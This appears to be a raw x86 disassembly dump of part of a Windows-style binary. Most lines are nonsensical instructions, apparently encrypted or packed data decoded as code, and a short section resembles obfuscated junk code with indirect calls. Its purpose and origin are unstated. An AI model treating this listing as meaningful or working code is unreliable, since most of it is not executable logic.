  406a74:	mov    BYTE PTR [ecx-0x54],dh
  406a77:	add    al,0x29
  406a79:	or     DWORD PTR [ebp-0x7d],esp
  406a7c:	sbb    bl,BYTE PTR ds:0x201646a1
  406a82:	pop    esp
  406a83:	mov    dh,0xd2
  406a85:	fist   WORD PTR [ebx+0x1c57feb1]
  406a8b:	retf   
  406a8c:	in     al,dx
  406a8d:	xor    ebx,DWORD PTR [ebp-0x7a]
  406a90:	daa    
  406a91:	cmp    esi,edx
  406a93:	icebp  
  406a94:	in     al,0x5a
  406a96:	ret    
  406a97:	mov    ds:0xd009186d,al
  406a9c:	test   eax,0xa6b14a54
  406aa1:	out    0xf2,eax
  406aa3:	repz or DWORD PTR [ecx],ebx
  406aa6:	cld    
  406aa7:	cdq    
  406aa8:	loop   0x406b0b
  406aaa:	mov    DWORD PTR [edx-0x264467d0],edx
  406ab0:	rcl    DWORD PTR [edx],cl
  406ab2:	push   esi
  406ab3:	add    BYTE PTR [ecx-0x98113dc],ch
  406ab9:	les    ebx,FWORD PTR [edx+0x22]
  406abc:	retf   
  406abd:	out    0x72,al
  406abf:	xor    ah,BYTE PTR [edi+0x6bf61bce]
  406ac5:	xor    ch,ah
  406ac7:	sar    DWORD PTR [esi],cl
  406ac9:	sbb    ah,BYTE PTR [edi+0x7ddda42d]
  406acf:	mov    dh,0xd
  406ad1:	dec    edi
  406ad2:	sub    eax,0x62feada2
  406ad7:	aaa    
  406ad8:	and    esi,edx
  406ada:	scas   eax,DWORD PTR es:[edi]
  406adb:	(bad)  
  406adc:	enter  0xc396,0x83
  406ae0:	push   eax
  406ae1:	popa   
  406ae2:	imul   ebx,DWORD PTR [eax-0xa],0xed420595
  406ae9:	call   0xe64a:0x38a096c8
  406af0:	cli    
  406af1:	test   eax,esi
  406af3:	ins    DWORD PTR es:[edi],dx
  406af4:	daa    
  406af5:	inc    edi
  406af6:	push   edx
  406af7:	lea    ebp,[eax+0x4f]
  406afa:	xchg   BYTE PTR [ebp-0x7f],dl
  406afd:	push   edx
  406afe:	aam    0xb4
  406b00:	imul   cl
  406b02:	fwait
  406b03:	push   ds
  406b04:	rcr    DWORD PTR [ecx],0x99
  406b07:	imul   ebx,DWORD PTR [eax-0x3ea70dc7],0x5f68a00e
  406b11:	pop    esi
  406b12:	inc    esi
  406b13:	xor    al,0x74
  406b15:	xchg   edi,eax
  406b16:	jne    0x406afe
  406b18:	add    bl,dh
  406b1a:	mov    ecx,0x7540f209
  406b1f:	xchg   ebx,eax
  406b20:	mov    esp,DWORD PTR [edi+0x6cddd688]
  406b26:	cs (bad) 
  406b28:	fsubp  st(5),st
  406b2a:	test   DWORD PTR [eax-0x1b],edx
  406b2d:	and    eax,0xa6249452
  406b32:	inc    esi
  406b33:	jb     0x406ba2
  406b35:	popf   
  406b36:	mov    ebp,0x5be82f74
  406b3b:	stc    
  406b3c:	push   esp
  406b3d:	imul   ebp,DWORD PTR [ebp-0x4],0xf0a484e6
  406b44:	or     DWORD PTR [edx-0x23],ebx
  406b47:	xlat   BYTE PTR ds:[ebx]
  406b48:	mov    ch,0xa
  406b4a:	sub    bl,BYTE PTR [edx+0x53]
  406b4d:	pop    ss
  406b4e:	xor    edi,edx
  406b50:	cmp    eax,0x94bd9f2e
  406b55:	xchg   DWORD PTR ds:0xfd808b4b,esp
  406b5b:	iret   
  406b5c:	pop    esp
  406b5d:	xchg   ecx,eax
  406b5e:	loop   0x406b96
  406b60:	je     0x406af1
  406b62:	ret    0xedbf
  406b65:	cmp    BYTE PTR [esi-0x3],cl
  406b68:	adc    al,0x5b
  406b6a:	sub    esp,DWORD PTR [ecx+0x74f152d8]
  406b70:	inc    edi
  406b71:	jmp    0xf701:0xdc13d6ad
  406b78:	and    BYTE PTR [ebx],cl
  406b7a:	daa    
  406b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b7c:	push   ebp
  406b7d:	push   edx
  406b7e:	imul   edx,DWORD PTR [esi+0x39c151],0xffffff8f
  406b85:	aad    0x37
  406b87:	rol    esi,0x56
  406b8a:	fldenv [esi+0x649dcfa]
  406b90:	xlat   BYTE PTR ds:[ebx]
  406b91:	add    eax,0xfab9e3c5
  406b96:	jae    0x406bdf
  406b98:	mov    eax,ds:0xa4175f52
  406b9d:	into   
  406b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9f:	test   DWORD PTR [ebx+0x53],edx
  406ba2:	in     eax,dx
  406ba3:	ret    
  406ba4:	push   ebp
  406ba5:	inc    ecx
  406ba6:	inc    esi
  406ba7:	test   DWORD PTR [ecx],edi
  406ba9:	pop    ecx
  406baa:	lods   al,BYTE PTR ds:[esi]
  406bab:	push   esp
  406bac:	stos   DWORD PTR es:[edi],eax
  406bad:	jmp    0x8bc4:0xbf94faf8
  406bb4:	sbb    dh,BYTE PTR [edi+eax*8+0x1cfc979e]
  406bbb:	cdq    
  406bbc:	sar    al,1
  406bbe:	sub    edi,edx
  406bc0:	lea    ebx,[ecx]
  406bc2:	mov    WORD PTR [esi-0x4],gs
  406bc5:	icebp  
  406bc6:	inc    edx
  406bc7:	jno    0x406b7d
  406bc9:	clc    
  406bca:	test   eax,0xdddb5a2d
  406bcf:	aam    0x18
  406bd1:	pop    ss
  406bd2:	out    dx,eax
  406bd3:	inc    esi
  406bd4:	xchg   DWORD PTR [eax],esp
  406bd6:	cld    
  406bd7:	test   al,0x29
  406bd9:	aaa    
  406bda:	xor    bh,ch
  406bdc:	aas    
  406bdd:	cmp    DWORD PTR [edi-0x66689df1],ebx
  406be3:	call   0x12e67c26
  406be8:	pop    ss
  406be9:	sbb    al,BYTE PTR [ebp-0xbffaed2]
  406bef:	pop    ss
  406bf0:	mov    al,ds:0x2c88c981
  406bf5:	mov    ds:0xaf2fa5a4,al
  406bfa:	repz sub al,0x87
  406bfd:	(bad)  
  406bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bff:	test   eax,0xaec8ed3d
  406c04:	stos   DWORD PTR es:[edi],eax
  406c05:	(bad)  
  406c06:	es jmp 0xa64a:0x7fbe309b
  406c0e:	test   eax,0x7c094875
  406c13:	pop    edx
  406c14:	js     0x406c04
  406c16:	jp     0x406c14
  406c18:	cmp    eax,0x4aa96992
  406c1d:	pop    ds
  406c1e:	aas    
  406c1f:	mov    esp,0xd23eb125
  406c24:	das    
  406c25:	aam    0x10
  406c27:	and    esp,esp
  406c29:	cld    
  406c2a:	pop    es
  406c2b:	xlat   BYTE PTR cs:[ebx]
  406c2d:	jnp    0x406bf9
  406c2f:	sub    al,0xe2
  406c31:	adc    DWORD PTR [esp+edi*2],esi
  406c34:	popf   
  406c35:	xlat   BYTE PTR ds:[ebx]
  406c36:	pushf  
  406c37:	test   ecx,ebx
  406c39:	aas    
  406c3a:	mov    cl,0x24
  406c3c:	xchg   edx,eax
  406c3d:	clc    
  406c3e:	jp     0x406cbe
  406c40:	int    0xe1
  406c42:	xlat   BYTE PTR ds:[ebx]
  406c43:	push   eax
  406c44:	test   al,0x9e
  406c46:	mov    cl,0xac
  406c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c49:	gs mov bh,0xb0
  406c4c:	jmp    0x406c6f
  406c4e:	adc    dl,ch
  406c50:	jb     0x406cba
  406c52:	icebp  
  406c53:	shl    cl,0x13
  406c56:	ss int3 
  406c58:	mov    ebp,0x65a28ead
  406c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5e:	adc    DWORD PTR [esi],esp
  406c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c62:	sub    al,0xa
  406c64:	data16 std 
  406c66:	pop    esi
  406c67:	(bad)
  406c6a:	jo     0x406c28
  406c6c:	(bad)  
  406c6e:	aad    0x7f
  406c70:	xchg   ebx,ebx
  406c72:	mov    ebx,DWORD PTR [edi+0x65]
  406c75:	aas    
  406c76:	xor    al,0xb9
  406c78:	iret   
  406c79:	icebp  
  406c7a:	dec    eax
  406c7b:	shr    BYTE PTR [ecx+0x7],cl
  406c7e:	pusha  
  406c7f:	cdq    
  406c80:	inc    ecx
  406c81:	ins    DWORD PTR es:[edi],dx
  406c82:	mov    gs,WORD PTR [eax+0x4b1d23e3]
  406c88:	push   esi
  406c89:	inc    ebx
  406c8a:	dec    ebp
  406c8b:	stos   BYTE PTR es:[edi],al
  406c8c:	cmp    al,0xe1
  406c8e:	sahf   
  406c8f:	aaa    
  406c90:	pop    esp
  406c91:	push   0x77027614
  406c96:	out    dx,al
  406c97:	inc    ecx
  406c98:	ror    al,1
  406c9a:	push   eax
  406c9b:	jmp    0x406c38
  406c9d:	dec    edx
  406c9e:	xchg   edx,eax
  406c9f:	push   ecx
  406ca0:	sbb    al,0x58
  406ca2:	js     0x406c8e
  406ca4:	dec    edx
  406ca5:	int3   
  406ca6:	iret   
  406ca7:	mov    edx,0x8dafc56c
  406cac:	and    BYTE PTR [ecx+0x45],0xa5
  406cb0:	and    DWORD PTR [ebp-0x6dee10e4],0x9b04d77d
  406cba:	xchg   esi,eax
  406cbb:	pop    ecx
  406cbc:	and    al,BYTE PTR [ecx+0x1b2d55ee]
  406cc2:	ret    0x7c07
  406cc5:	add    bl,0xa1
  406cc8:	add    dh,BYTE PTR [ebp+edx*4-0x44bf1437]
  406ccf:	mov    ch,0xcf
  406cd1:	and    DWORD PTR [esi],ebp
  406cd3:	cmc    
  406cd4:	stc    
  406cd5:	jp     0x406ca7
  406cd7:	std    
  406cd8:	and    cl,BYTE PTR [ebp-0x45]
  406cdb:	and    DWORD PTR [ebx],edx
  406cdd:	mov    cl,cl
  406cdf:	cdq    
  406ce0:	pop    ebp
  406ce1:	leave  
  406ce2:	add    al,0x2f
  406ce4:	daa    
  406ce5:	outs   dx,BYTE PTR ds:[esi]
  406ce6:	jp     0x406c77
  406ce8:	stc    
  406ce9:	iret   
  406cea:	mov    gs,WORD PTR [edx+0x75fde27b]
  406cf0:	inc    ecx
  406cf1:	in     eax,dx
  406cf2:	mov    dl,0xa8
  406cf4:	or     al,0xbd
  406cf6:	mov    bh,0xd8
  406cf8:	pop    edi
  406cf9:	nop
  406cfa:	sbb    cl,BYTE PTR [ebp-0x1354fc83]
  406d00:	mov    ds:0x87a88f57,eax
  406d05:	mov    edx,0x7ac46c44
  406d0a:	mov    eax,DWORD PTR [ecx]
  406d0c:	lds    edi,FWORD PTR [edx-0x2d4481b2]
  406d12:	mov    edi,esp
  406d14:	ror    edi,1
  406d16:	jnp    0x406cb3
  406d18:	sub    ch,BYTE PTR [edx+ecx*1-0x1a]
  406d1c:	enter  0xba2,0xc0
  406d20:	dec    ecx
  406d21:	scas   al,BYTE PTR es:[edi]
  406d22:	xchg   BYTE PTR [ecx],dh
  406d24:	xchg   esp,eax
  406d25:	bound  ebp,QWORD PTR [esi+0x6a]
  406d28:	cli    
  406d29:	bound  esi,QWORD PTR [eax]
  406d2b:	mov    cl,0x18
  406d2d:	sbb    eax,0x7c4ad79b
  406d32:	mov    ebx,0x888decc0
  406d37:	inc    BYTE PTR [esp+edx*4+0x2e4181b1]
  406d3e:	call   0x36be:0x1b5b291c
  406d45:	mov    BYTE PTR [edi-0x1013c11f],ch
  406d4b:	fwait
  406d4c:	jno    0x406db8
  406d4e:	adc    BYTE PTR [ebx+0x111fb8c4],bh
  406d54:	dec    esi
  406d55:	jecxz  0x406d61
  406d57:	in     eax,dx
  406d58:	mov    BYTE PTR [ebx+ebx*4+0x35de1e0f],dl
  406d5f:	inc    esi
  406d60:	xor    al,0x93
  406d62:	repz cmp dl,al
  406d65:	popa   
  406d66:	enter  0x253b,0xbb
  406d6a:	stos   BYTE PTR es:[edi],al
  406d6b:	shl    DWORD PTR [esi],1
  406d6d:	adc    DWORD PTR [ecx+0x40b688c9],edx
  406d73:	mov    al,0x35
  406d75:	aaa    
  406d76:	pop    edx
  406d77:	in     eax,0x40
  406d79:	add    DWORD PTR [edx],esp
  406d7b:	test   eax,0xfb98b6a1
  406d80:	rcl    DWORD PTR ds:0x3b274914,cl
  406d86:	or     ecx,ebp
  406d88:	xor    cl,BYTE PTR [edi-0x42]
  406d8b:	pop    esp
  406d8c:	jns    0x406d69
  406d8e:	ins    BYTE PTR es:[edi],dx
  406d8f:	fnsave [eax-0x52]
  406d92:	shl    BYTE PTR [ecx+0x3a],cl
  406d95:	mov    BYTE PTR ds:0x8f8779e,dh
  406d9b:	sbb    BYTE PTR [eax],al
  406d9d:	pusha  
  406d9e:	into   
  406d9f:	mov    al,ds:0x922dc076
  406da4:	add    BYTE PTR [edx-0x2e],cl
  406da7:	retf   
  406da8:	mov    dh,0x32
  406daa:	mov    eax,ds:0x93bb7cd4
  406daf:	adc    DWORD PTR [eax],esp
  406db1:	ficom  DWORD PTR [edi+0x5fe841ca]
  406db7:	jge    0x406de7
  406db9:	pop    edi
  406dba:	scas   al,BYTE PTR es:[edi]
  406dbb:	mov    dl,0xb1
  406dbd:	jg     0x406d83
  406dbf:	int    0x49
  406dc1:	mul    BYTE PTR [edx+0x1c8f1219]
  406dc7:	push   ebp
  406dc8:	push   esi
  406dc9:	push   edi
  406dca:	out    dx,eax
  406dcb:	ret    
  406dcc:	pusha  
  406dcd:	jp     0x406d7f
  406dcf:	leave  
  406dd0:	fcmovnbe st,st(6)
  406dd2:	stos   BYTE PTR es:[edi],al
  406dd3:	arpl   di,sp
  406dd5:	in     al,0x50
  406dd7:	jmp    0xe88a5076
  406ddc:	push   ss
  406ddd:	(bad)  
  406dde:	pop    esp
  406ddf:	add    al,0x98
  406de1:	pushf  
  406de2:	push   ds
  406de3:	or     bh,BYTE PTR [ecx]
  406de5:	repz ror DWORD PTR [ecx],cl
  406de8:	ret    0x3306
  406deb:	test   al,0x6e
  406ded:	fisttp DWORD PTR [ecx-0x19187b6]
  406df3:	out    0xbc,al
  406df5:	dec    edx
  406df6:	sub    ah,al
  406df8:	lds    ebx,FWORD PTR [edx]
  406dfa:	xor    dl,ah
  406dfc:	inc    ebp
  406dfd:	lahf   
  406dfe:	or     BYTE PTR ds:0x8204b358,bh
  406e04:	or     DWORD PTR [edi-0x6e],edx
  406e07:	sbb    DWORD PTR [edx+0x7b38f941],edi
  406e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e0e:	xchg   esi,eax
  406e0f:	xchg   ebp,eax
  406e10:	adc    eax,0x30da0232
  406e15:	adc    eax,0x7c817886
  406e1a:	jle    0x406e98
  406e1c:	nop
  406e1d:	mov    ds:0x58f01a19,al
  406e22:	(bad)  
  406e23:	call   0xe6d9889e
  406e28:	mov    esi,0x9ca62d7a
  406e2d:	jns    0x406e80
  406e2f:	stos   BYTE PTR es:[edi],al
  406e30:	sbb    DWORD PTR [ebp+0x2cb08121],ecx
  406e36:	dec    eax
  406e37:	sub    DWORD PTR [edx-0x66d99055],0xffffff8a
  406e3e:	inc    eax
  406e3f:	mov    ah,0xe7
  406e41:	std    
  406e42:	into   
  406e43:	mov    ss:0x9312f635,eax
  406e49:	das    
  406e4a:	retf   
  406e4b:	jns    0x406ea7
  406e4d:	or     edi,DWORD PTR [ebx-0x20c848ac]
  406e53:	mov    edx,0xc2c24a64
  406e58:	int    0xc3
  406e5a:	pusha  
  406e5b:	popa   
  406e5c:	add    DWORD PTR [ebx+0x12aa4bba],edi
  406e62:	sbb    BYTE PTR [eax+0x6a64bf84],dh
  406e68:	xchg   ebx,eax
  406e69:	mov    ebx,0x6a5eff9c
  406e6e:	mov    dl,0x21
  406e70:	push   edx
  406e71:	adc    BYTE PTR [ebx],dl
  406e73:	imul   esp,DWORD PTR [edx-0x6e56fe24],0xb37b20e0
  406e7d:	imul   ebp,DWORD PTR [eax+0x7a],0xa019556
  406e84:	pop    ss
  406e85:	mov    dl,0x51
  406e87:	cmc    
  406e88:	mov    edx,0x18e62f7c
  406e8d:	fcmovnu st,st(5)
  406e8f:	sti    
  406e90:	push   edi
  406e91:	sub    bh,BYTE PTR ds:0x4d2fff12
  406e97:	mov    al,0x85
  406e99:	inc    DWORD PTR [esi-0x2d]
  406e9c:	and    BYTE PTR [ecx+0x1f9973a4],dl
  406ea2:	bound  ebx,QWORD PTR [edx-0x2a8de6cd]
  406ea8:	adc    eax,0xc5c9e9f6
  406ead:	cwde   
  406eae:	inc    esp
  406eaf:	std    
  406eb0:	mov    al,0xbd
  406eb2:	into   
  406eb3:	inc    ecx
  406eb4:	push   0x6c4e470e
  406eb9:	and    al,0xd3
  406ebb:	fs int3 
  406ebd:	cmp    eax,0x5af3ae9a
  406ec2:	test   al,0xc2
  406ec4:	xlat   BYTE PTR ds:[ebx]
  406ec5:	jb     0x406e66
  406ec7:	mov    esi,0xbb51f4c8
  406ecc:	mov    eax,0x12a460e9
  406ed1:	push   esp
  406ed2:	jle    0x406f1e
  406ed4:	push   ebx
  406ed5:	ds (bad) 
  406ed7:	jmp    0x8787e9c9
  406edc:	add    DWORD PTR ds:0x819a16f5,ebp
  406ee2:	iret   
  406ee3:	(bad)  
  406ee4:	push   eax
  406ee5:	jb     0x406ef8
  406ee7:	inc    eax
  406ee8:	xchg   esp,eax
  406ee9:	xlat   BYTE PTR ds:[ebx]
  406eea:	pop    es
  406eeb:	xor    BYTE PTR [ecx],ah
  406eed:	sub    DWORD PTR [eax+0x6f80f1cd],0x51
  406ef4:	cli    
  406ef5:	xchg   ebp,eax
  406ef6:	and    al,0x53
  406ef8:	adc    ebx,DWORD PTR [ebx-0x7]
  406efb:	pop    esp
  406efc:	jnp    0x406f20
  406efe:	out    dx,al
  406eff:	fst    st(1)
  406f01:	iret   
  406f02:	ins    BYTE PTR es:[edi],dx
  406f03:	aam    0xa6
  406f05:	sub    ebp,edx
  406f07:	int    0x20
  406f09:	push   ebx
  406f0a:	cmp    esp,ecx
  406f0c:	or     ah,ah
  406f0e:	shl    DWORD PTR [esi],0xf1
  406f11:	iret   
  406f12:	out    0x71,eax
  406f14:	xor    BYTE PTR ds:0xa9704559,bh
  406f1a:	lds    edi,FWORD PTR ds:0x6143b683
  406f20:	lock inc ecx
  406f22:	mov    bh,0x2f
  406f24:	and    eax,DWORD PTR [eax]
  406f26:	into   
  406f27:	cmp    DWORD PTR [ecx+0x61],ebx
  406f2a:	in     eax,dx
  406f2b:	outs   dx,DWORD PTR ds:[esi]
  406f2c:	push   ebx
  406f2d:	add    ch,dl
  406f2f:	fsincos 
  406f31:	jbe    0x406f19
  406f33:	push   ebp
  406f34:	push   esp
  406f35:	dec    ecx
  406f36:	bound  edx,QWORD PTR [ecx-0x40addc91]
  406f3c:	mov    edx,0x19af8409
  406f41:	ins    BYTE PTR es:[edi],dx
  406f42:	push   0x39
  406f44:	inc    esp
  406f45:	shl    DWORD PTR [esi+0x78],1
  406f48:	pop    ds
  406f49:	imul   BYTE PTR [edx+0x217b7a2]
  406f4f:	cdq    
  406f50:	push   ds
  406f51:	mov    ebx,0xbfab7ae5
  406f56:	pop    eax
  406f57:	fld    QWORD PTR [esi+eiz*8]
  406f5a:	push   ecx
  406f5b:	mov    dh,0xe2
  406f5d:	gs push es
  406f5f:	push   es
  406f60:	in     eax,dx
  406f61:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406f63:	xor    esi,DWORD PTR [ebx]
  406f65:	test   eax,edi
  406f67:	xchg   edi,eax
  406f68:	pop    eax
  406f69:	xchg   ebx,eax
  406f6a:	mov    edx,0x3f216b75
  406f6f:	adc    ah,bl
  406f71:	xchg   esp,eax
  406f72:	loope  0x406f5f
  406f74:	es jb  0x406fb3
  406f77:	add    DWORD PTR [edi+ebp*8],edi
  406f7a:	push   ss
  406f7b:	dec    ecx
  406f7c:	daa    
  406f7d:	adc    esp,esi
  406f7f:	xchg   esi,eax
  406f80:	xchg   edi,eax
  406f81:	push   DWORD PTR [edx]
  406f83:	push   ebx
  406f84:	loopne 0x406fff
  406f86:	iret   
  406f87:	mov    bh,0x6c
  406f89:	mov    bl,0xe1
  406f8b:	sar    DWORD PTR [esi+edx*4],0xd5
  406f8f:	adc    DWORD PTR [edi-0x2c],ebx
  406f92:	ret    0xcd6e
  406f95:	push   edi
  406f96:	sar    DWORD PTR [ebx+0xfe256d0],cl
  406f9c:	pop    ecx
  406f9d:	ja     0x406fd6
  406f9f:	fucomi st,st(4)
  406fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fa2:	inc    ecx
  406fa3:	push   0x331ee1c1
  406fa8:	leave  
  406fa9:	xor    DWORD PTR ds:0x4229ba,0x4229a2
  406fb3:	or     ecx,DWORD PTR [ebp-0x1c]
  406fb6:	shr    edx,0x2
  406fb9:	xor    edx,DWORD PTR ds:0x422892
  406fbf:	mov    edx,DWORD PTR [esi+0x4]
  406fc2:	mov    DWORD PTR [ebp-0x2c],ecx
  406fc5:	cmp    DWORD PTR ds:0x422992,0x0
  406fcc:	mov    DWORD PTR ds:0x4228ee,0x4f9e
  406fd6:	mov    edx,0x30c0
  406fdb:	mov    edx,DWORD PTR ds:0x422936
  406fe1:	jmp    0x407022
  406fe6:	mov    DWORD PTR ds:0x42296a,0x6ad7
  406ff0:	je     0x407011
  406ff6:	push   0x592a
  406ffb:	call   DWORD PTR ds:0x42a018
  407001:	xor    edx,edx
  407003:	or     edx,DWORD PTR ds:0x4228b6
  407009:	xor    DWORD PTR ds:0x42294a,edx
  40700f:	add    ecx,edx
  407011:	inc    ecx
  407012:	or     ecx,0x572d
  407018:	adc    DWORD PTR ds:0x422992,0x6861
  407022:	mov    ecx,DWORD PTR [ebp+0x18]
  407025:	cmp    DWORD PTR ds:0x422966,0x0
  40702c:	mov    DWORD PTR ds:0x42299a,0x24bb
  407036:	mov    DWORD PTR ds:0x422992,0x4860
  407040:	jmp    0x4070fc
  407045:	mov    DWORD PTR ds:0x4228ea,0x356f
  40704f:	jle    0x407079
  407055:	push   DWORD PTR [ebp-0x18]
  407058:	push   0x5570
  40705d:	push   0x150b
  407062:	push   0x5476
  407067:	push   0x7791
  40706c:	push   0x2991
  407071:	call   DWORD PTR ds:0x42a01c
  407077:	inc    edx
  407078:	dec    edx
  407079:	sbb    DWORD PTR ds:0x4229c6,0x42296e
  407083:	sub    edx,DWORD PTR ds:0x422926
  407089:	cmp    DWORD PTR ds:0x4228d6,0x0
  407090:	mov    edx,DWORD PTR ds:0x422952
  407096:	mov    edx,0x5ca6
  40709b:	not    edx
  40709d:	jmp    0x4070fc
  4070a2:	mov    DWORD PTR ds:0x4228f6,0x627
  4070ac:	jae    0x4070d8
  4070b2:	push   0x5b8a
  4070b7:	push   0x190e
  4070bc:	call   DWORD PTR ds:0x42a2a0
  4070c2:	add    DWORD PTR ds:0x42297a,edi
  4070c8:	xor    DWORD PTR ds:0x42293a,edi
  4070ce:	and    DWORD PTR ds:0x4229b2,0x7045
  4070d8:	sbb    DWORD PTR ds:0x4228f6,0x244f
  4070e2:	adc    DWORD PTR ds:0x4229a2,ebx
  4070e8:	xor    edx,edx
  4070ea:	xor    edx,DWORD PTR ds:0x42296e
  4070f0:	add    edx,DWORD PTR ds:0x422986
  4070f6:	mov    DWORD PTR ds:0x42296e,edx
  4070fc:	mov    edx,DWORD PTR [ebp+0x1c]
  4070ff:	shrd   ecx,edx,0x2
  407103:	add    DWORD PTR ds:0x4229be,0x1936
  40710d:	jmp    0x407697
  407112:	loope  0x4070db
  407114:	ja     0x407111
  407116:	xor    DWORD PTR [edx],ebx
  407118:	pusha  
  407119:	pushf  
  40711a:	sub    DWORD PTR [edi],esp
  40711c:	scas   al,BYTE PTR es:[edi]
  40711d:	jb     0x407150
  40711f:	popf   
  407120:	mov    ds:0x166dc972,al
  407125:	push   ss
  407126:	cmp    eax,0x6b161604
  40712b:	and    DWORD PTR [ebx-0x5898c124],edx
  407131:	fwait
  407132:	mov    ?,WORD PTR [edx+0x30]
  407135:	sub    ecx,0x21c29640
  40713b:	ss nop
  40713d:	rcl    DWORD PTR [esi-0x6d],0xe7
  407141:	dec    ebx
  407142:	inc    ebx
  407143:	mul    BYTE PTR [eax]
  407145:	test   eax,0x3f669dd5
  40714a:	out    0x18,eax
  40714c:	outs   dx,BYTE PTR ds:[esi]
  40714d:	xor    al,0xf4
  40714f:	pushf  
  407150:	and    al,ch
  407152:	bound  ebp,QWORD PTR [eax+0x7e1f829c]
  407158:	or     DWORD PTR [ebx+0x1d187b1f],edi
  40715e:	hlt    
  40715f:	mov    esp,0xb27a4f86
  407164:	xchg   esp,eax
  407165:	scas   al,BYTE PTR es:[edi]
  407166:	cs out dx,eax
  407168:	push   edx
  407169:	and    BYTE PTR [ebx],ch
  40716b:	jmp    0x4071e7
  40716d:	mov    al,0xe0
  40716f:	pop    ss
  407170:	push   esp
  407171:	adc    BYTE PTR [edi-0x50],dh
  407174:	scas   al,BYTE PTR es:[edi]
  407175:	cmp    DWORD PTR [eax-0x70eb6707],0x4f
  40717c:	mov    gs,WORD PTR [eax+0x12]
  40717f:	hlt    
  407180:	lahf   
  407181:	popa   
  407182:	ins    DWORD PTR es:[edi],dx
  407183:	out    dx,al
  407184:	frstpm(287 only) 
  407186:	xchg   bh,ah
  407188:	sub    al,0xc3
  40718a:	std    
  40718b:	mov    DWORD PTR [edi-0x38f96edc],esp
  407191:	data16 fsubr DWORD PTR [ebx-0x34]
  407195:	dec    esi
  407196:	pop    ss
  407197:	adc    DWORD PTR [edi-0x3a8cf53e],edx
  40719d:	cmp    al,0x1c
  40719f:	pop    esp
  4071a0:	aas    
  4071a1:	inc    edi
  4071a2:	cmp    DWORD PTR [ecx-0xd],0x1dd4ad86
  4071a9:	inc    ebx
  4071aa:	lea    edi,ds:[edx+0x6e14defa]
  4071b1:	retf   0x7711
  4071b4:	pop    DWORD PTR [esi+0x7c34a392]
  4071ba:	ror    DWORD PTR [esi],cl
  4071bc:	inc    ebp
  4071bd:	push   ax
  4071bf:	sub    eax,DWORD PTR [esi+0x75]
  4071c2:	sub    ch,BYTE PTR [eax-0x400d29f4]
  4071c8:	mov    bl,0x1
  4071ca:	in     al,0x19
  4071cc:	imul   edi,esi,0xe97b1c11
  4071d2:	pop    es
  4071d3:	fiadd  DWORD PTR [eax+0x37]
  4071d6:	or     edx,eax
  4071d8:	jae    0x40720f
  4071da:	mov    al,ds:0x94b23f54
  4071df:	stos   BYTE PTR es:[edi],al
  4071e0:	xchg   esp,eax
  4071e1:	mov    edi,0x9a1ead4d
  4071e6:	dec    esp
  4071e7:	xchg   edi,eax
  4071e8:	vpsadbw ymm6,ymm4,ymm0
  4071ec:	mov    esp,0xbba403c9
  4071f1:	jmp    0xb1d82b0b
  4071f6:	jns    0x407241
  4071f8:	test   al,0xa4
  4071fa:	mov    eax,ds:0x6421cb8a
  4071ff:	jl     0x4071fe
  407201:	or     DWORD PTR [bp-0x67],eax
  407205:	pushf  
  407206:	cwde   
  407207:	shl    BYTE PTR [eax],1
  407209:	sbb    ecx,DWORD PTR [edx+0x9e98f99]
  40720f:	imul   esi,DWORD PTR [eax-0x41249824],0xffffffe6
  407216:	adc    ebp,DWORD PTR [ecx+edx*1+0x44]
  40721a:	aam    0xcc
  40721c:	inc    esi
  40721d:	aad    0x1a
  40721f:	mov    dl,dl
  407221:	pushf  
  407222:	push   ss
  407223:	ret    0x413
  407226:	pop    edi
  407227:	out    0xda,eax
  407229:	mov    cl,0xf3
  40722b:	ficomp WORD PTR [edi]
  40722d:	xlat   BYTE PTR ds:[ebx]
  40722e:	fnstsw WORD PTR [ebx]
  407230:	adc    DWORD PTR [eax+ebx*8],0xafb6fc67
  407237:	stos   DWORD PTR es:[edi],eax
  407238:	das    
  407239:	ss push ebx
  40723c:	or     ebx,DWORD PTR [ebx-0x36ece442]
  407242:	rol    BYTE PTR [esi+0x5e],1
  407245:	inc    edi
  407246:	xlat   BYTE PTR ds:[ebx]
  407247:	pop    ss
  407248:	jb     0x407263
  40724a:	nop
  40724b:	push   eax
  40724c:	mov    ah,BYTE PTR [edi+0xf]
  40724f:	adc    eax,DWORD PTR [ecx]
  407251:	cmp    edi,DWORD PTR [ebx-0x6b022249]
  407257:	sar    DWORD PTR [ebx-0x65617c48],cl
  40725d:	push   edx
  40725e:	sub    ebx,eax
  407260:	cs sub bl,dl
  407263:	push   eax
  407264:	test   al,0xaa
  407266:	add    eax,0x71e79c02
  40726b:	scas   eax,DWORD PTR es:[edi]
  40726c:	mov    ecx,esp
  40726e:	(bad)  
  40726f:	(bad)  
  407270:	pop    ds
  407271:	mov    edx,0x683d7e97
  407276:	out    dx,eax
  407277:	pop    ebx
  407278:	xchg   DWORD PTR [edi+0x64],esi
  40727b:	cdq    
  40727c:	ins    BYTE PTR es:[edi],dx
  40727d:	test   eax,0xef467cd8
  407282:	cli    
  407283:	sub    bh,BYTE PTR [edi+0x60]
  407286:	lock jmp 0x4072c9
  407289:	add    bl,BYTE PTR [edi-0x13addc58]
  40728f:	(bad)  
  407290:	cmp    esi,DWORD PTR [ebp+0x3f]
  407293:	dec    eax
  407294:	hlt    
  407295:	mov    dh,0x75
  407297:	dec    ecx
  407298:	ins    DWORD PTR es:[edi],dx
  407299:	mov    ah,0xbb
  40729b:	and    DWORD PTR [eax],ecx
  40729d:	mov    edx,0x7db92f5
  4072a2:	cmp    ebp,ebp
  4072a4:	sub    ecx,ebx
  4072a6:	outs   dx,BYTE PTR ds:[esi]
  4072a7:	(bad)  
  4072a8:	(bad)  
  4072a9:	cmp    DWORD PTR [edx-0x5f],ebx
  4072ac:	inc    ebx
  4072ad:	pushf  
  4072ae:	outs   dx,BYTE PTR ds:[esi]
  4072af:	inc    BYTE PTR [edi]
  4072b1:	dec    ecx
  4072b2:	sbb    al,BYTE PTR [edi]
  4072b4:	push   edi
